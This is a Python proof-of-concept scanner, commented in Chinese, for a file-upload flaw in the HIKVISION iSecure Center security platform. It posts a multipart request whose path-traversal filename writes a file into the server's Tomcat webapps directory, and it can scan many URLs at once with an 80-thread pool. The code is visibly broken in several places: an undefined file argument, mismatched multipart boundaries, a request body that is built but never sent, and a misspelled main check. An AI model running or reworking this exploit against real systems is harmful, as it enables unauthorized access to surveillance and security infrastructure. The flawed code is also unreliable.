#导包
import requests,sys,argparse,json,re
from multiprocessing.dummy import Pool
#关闭警告
requests.packages.urllib3.disable_warnings()
#横幅
def banner():
    test = """"
              _                 _    __ _ _      
             | |               | |  / _(_) |     
  _   _ _ __ | | ___   __ _  __| | | |_ _| | ___ 
 | | | | '_ \| |/ _ \ / _` |/ _` | |  _| | |/ _ \
 | |_| | |_) | | (_) | (_| | (_| | | | | | |  __/
  \__,_| .__/|_|\___/ \__,_|\__,_| |_| |_|_|\___|
       | |                                       
       |_|                                       


"""
    print(test)


#主函数
def main():
    banner()
    parser = argparse.ArgumentParser(description='HIKVISION iSecure Center综合安防管理平台文件上传')
    parser.add_argument('-u','--url',dest='url',type=str,help='please input your url')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")




#poc函数
def poc(target):
    payload = '/center/api/files;.js'
    headers = {
        'User-Agent': 'python-requests/2.31.0',
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Connection': 'close',
        'Content-Length': '258',
        'Content-Type': 'multipart/form-data; boundary=e54e7e5834c8c50e92189959fe7227a4',
    }
    data = '--ea26cdac4990498b32d7a95ce5a5135c\nContent-Disposition: form-data; name="file"; filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/153107606.txt"\nContent-Type: application/octet-stream\n\n332299402\n--ea26cdac4990498b32d7a95ce5a5135c--'
    res = requests.post(url=target + payload,headers=headers,verify=False)
    if res.status_code ==200 and 'data' in res.text:
        print(f'[+]{target}存在漏洞')
    else:
        print(f'[+]{target}不存在漏洞')
    

    

#函数入口
if __name__ =='___main__':
    main()
